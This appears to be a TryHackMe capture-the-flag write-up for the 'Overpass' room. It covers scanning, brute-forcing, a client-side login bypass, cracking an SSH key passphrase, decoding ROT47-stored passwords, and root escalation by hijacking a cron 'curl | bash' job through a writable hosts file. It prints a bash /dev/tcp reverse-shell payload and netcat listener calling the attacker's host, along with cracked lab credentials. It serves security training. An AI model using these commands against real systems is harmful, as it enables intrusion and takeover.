---
layout: post
title: THM Write Up - Overpass
category: TryHackMe

---

TryHackMe URL: https://tryhackme.com/room/overpassl

As usual, start with an nmap scan
`nmap 10.10.184.50`

nmap results:
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 18:42 EDT
Nmap scan report for 10.10.184.50
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds
```

HTTP server is interesting, let's look into that

![[Pasted image 20210924084939.png]]

While we explore the site let's run gobuster to ennumerate directories on the web server:
`gobuster dir -u http://10.10.184.50 -w /usr/share/wordlists/dirb/big.txt -t10 `

The about us page has a list of staff, including handles, save this as  a username list of probable accounts:
```
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```

GoBuster Results:
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.184.50
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/23 18:47:29 Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]    
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]      
                                                              
===============================================================
2021/09/23 18:57:02 Finished
===============================================================
```

Navigating to the /admin page we see a login form. Let's try logging in with the usernames found on the about us page. We'll use Hydra for this
`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt "http-post://10.10.184.50/api/login:username=^USER^&password=^PASS^:Incorrect"`

This will take some time so we'll leave it while we explore the web site more.

I had a look at the source code of the website, and the few javascript files loaded, nothing too interesting there.

We only scanned the default ports on nmap, so lets return to that and see if we can find anything else running:
`nmap -p- 10.10.184.50`

```
Nmap scan report for 10.10.184.50
Host is up (0.28s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
60017/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 3072.39 seconds
```

The extra port nmap showed disappeared on further scanning. Also the hydra attack didn't yeild any results after running a few hours, so time to try somethign else.

On the admin page we have the form fields to login. From my few manual attempts SQLi doesn't seem to work, but let's try sqlmap and see how it goes just to be safe.

`sqlmap -u "http://10.10.244.201/api/login" --data="username=user&password=pass"`

Looks like I was right. SQLmap finds it is not injectable.

However, if we look closer at the source of the login page there is something that looks interesting. Using Firefox dev tools we can see the login.js file that is handling the functioning of the form.

And while it submits the login credentials to the server for validation, it then acts on this validation on the client side in javascript.

![[Pasted image 20210929095124.png]]

So if we change the response to anything other than "Incorrect Credentials" then it will pass the javascript test. So firing up Burpsuite let's intercept the request and change the response. We'll just change the "Incorrect" to "correct" and see what happens.

![[Pasted image 20210929095409.png]]

And that lets us into the admin area! We probably could have acheived the same thing by setting the cookie directly.

The admin area reveals an SSH key for the user James
![[Pasted image 20210929095728.png]]

We'll save that, remembering to set the permissions to 600 for the key file, and see if we can log into the server via SSH:
```
chmod 600 jameskey
ssh -i jameskey james@10.10.244.201
```

The SSH server then asks for the passphrase for the key. So we're not quite in yet. We'll need to crack the passphrase.

First we convert the key into the correct format for john the ripper to crack using ssh2john.

`/usr/share/john/ssh2john.py jameskey > jameskey-john`

Then we crack it using the rockyou wordlist.

`john --wordlist=/usr/share/wordlists/rockyou.txt jameskey-john`

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (jameskey)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2021-09-28 20:04) 0.2257g/s 3237Kp/s 3237Kc/s 3237KC/sa6_123..*7¡Vamos!
Session completed
```

So the passphrase is "james13" let's try logging into SSH again.

And it works!

![[Pasted image 20210929100907.png]]

And we easily find the user flag in Jame's home directory.

### Root flag

In James's home directory there is also a file called todo.txt:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

So this file tells us 3 things:
1. The encryption used to store passwords in the overpass password manager is weak, and we'll probably be able to crack it.
2. James has probably started using overpass to store his passwords.
3. There is an automated build script running somewhere.

So let's start by seeing if we can crack the overpass encryption and access James's passwords.

Back on the Overpass website we are able to download the Overpass source code, reading this will probably reveal how the passwords are encrypted and where they are stored.

![[Pasted image 20210929102814.png]]

Looking at the first function in the source it appears that Overpass uses ROT47 to encrypt the stored passwords. So once we find them we should be easily able to decrypt them using a simple website like https://rot47.net

![[Pasted image 20210929103200.png]]

Further down the code we can see that a file path is referenced `~\.overpass`, this looks to be where the credential database is stored.

So let's jump back into our SSH session and see if James has that file in his home directory
```
james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

There it is. Decrypting that file using rot47.net:

`[{"name":"System","pass":"saydrawnlyingpicture"}]`

Looking at that result, and the source code again, it looks like it only stores the password and the service name. So is this just Jame's system login? Let's try opening a new SSH session, and using the password instead of the key.

![[Pasted image 20210929103918.png]]

Yep, looks like that password works there, so potentially we haven't found anything useful here. But we'll keep that password nearby it may yet come in handy.

Let's try and see if James has sudo access on this system:
```
sudo -l
[sudo] password for james: 
Sorry, user james may not run sudo on overpass-prod.
```

No. I guess that would have been too easy anyway.

Now remember James's todo list mentioned the automated build script. Let's see if we can find that, as if it is being run as root we might be able to exploit it and elevate our priviledges.

The first place to check is the crontab file

```
james@overpass-prod:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

There we see it on the last line. Every minute cron will download the buildscript from the webside and execute it as root. So if we can edit that script we can run whatever command we want as root.

Now we just need to find where the script is, since the reference in the crontab pulls it from the webserver.  There doesn't seem to be any obvious directories that are the web root in `/var` so let's just search the system for the script.

`find / -iname buildscript.sh -type f 2>/dev/null`

But this gives us no results. So if the script is on this system, then we must not have access to it.

The way the script is being accessed might give us another way in though. The curl command is using the host overpass.thm and not an IP address. If we look at /etc/hosts we can see that it is mapped to the localhost IP 127.0.0.1 and the other interesting thing is that we have write permissions for the hosts file

```
james@overpass-prod:~$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 253 Sep 29 01:09 /etc/hosts
```

So if we change the IP address for overpass.thm to our local address, then the curl request in the crontab will be made there, and we can supply whatever build script we like.

Let's start a web server on our local machine with python
`python3 -m http.server 80`
pretty quickly we start to see requests coming in from the cron job, at the moment they are just giving 404 errors because we haven't put a file in an appropriate path
```
10.10.244.201 - - [28/Sep/2021 21:09:16] code 404, message File not found
10.10.244.201 - - [28/Sep/2021 21:09:16] "GET /downloads/src/buildscript.sh HTTP/1.1" 404 -
```

So let's save the below as the buildscript.sh on our webserver (replacing the IP with our own)

`bash -i >& /dev/tcp/10.10.10.10/1234 0>&1`

and then  start up a netcat listener to receive the remote shell request

`nc -lnvp 1234`

And within a minute you should see the successful request made to the python web server, and then the connection on the netcat listener:

![[Pasted image 20210929114619.png]]

And just like that we now have root access! The root flag is right there.
